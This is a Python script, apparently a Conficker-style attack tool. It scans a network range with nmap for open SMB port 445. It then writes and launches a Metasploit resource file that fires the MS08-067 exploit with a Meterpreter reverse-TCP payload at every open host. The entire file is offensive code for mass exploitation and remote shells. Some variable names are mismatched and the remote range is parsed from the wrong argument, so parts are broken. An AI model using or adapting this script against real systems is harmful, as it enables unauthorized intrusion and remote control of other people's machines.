import os
import nmap
import argparse
nm = nmap.PortScanner()

def setupHandler(configFile,lhost,lport):
        configFile.write("use exploit/multi/handler\n")
        configFile.write("set LHOST " + lhost + "\n")
        configFile.write("set LPORT " + lport + "\n")
        configFile.write("set payload windows/meterpreter/reverse_tcp\n")
        configFile.write("exploit -j -z\n")
        configFile.write("setg DisablePayloadHandler 1\n")

def exploitTgts(configfile,lhost,lport,rhost,rport):
        configFile.write("use exploit/windows/smb/ms08_067_netapi\n")
        configFile.write("set LHOST " + lhost + "\n")
        configFile.write("set LPORT " + lport + "\n")
        configFile.write("set RHOST " + rhost + "\n")
        configFile.write("set RPORT " + rport + "\n")
        configFile.write("set payload windows/meterpreter/reverse_tcp\n")

parser = argparse.ArgumentParser()
parser.add_argument("remote",type=str,help="remote: x.x.x.x/subnet_mask")
parser.add_argument("-l","--local",type=str,help="local: ip:port")
args = parser.parse_args()

if(not args.local):
        print "Enter local ip" 
        exit(1)
local = args.local.strip().split(":")
lhost = local[0].strip()
lport = ""
if(len(local)>1):
        lport = local[1].strip()
else:
        lport = "7777"

if(not args.remote):
        print "Enter remote ip/range"
        exit(1)
remote = args.local.strip().split(" ")
rhosts = remote[0]
rport = ""
if(len(remote)>1):
        rport = remote[1]
else:
        rport = "445"


open_hosts = []
nm.scan(hosts=rhosts,ports=rport)

for host in nm.all_hosts():
    if(nm[host]["tcp"][445]["state"] == "open"):
        open_hosts.append(host)

try:
        configFile = open("conficker.rc","w")
        setupHandler(configFile,lhost,lport)

        for h in open_hosts:
                exploitTgts(configFile,lhost=lhost,lport=lport,rhost = h,rport=rport)

        configFile.close()
        os.system("msfconsole -r conficker.rc")
except OSError as err:
        print err
        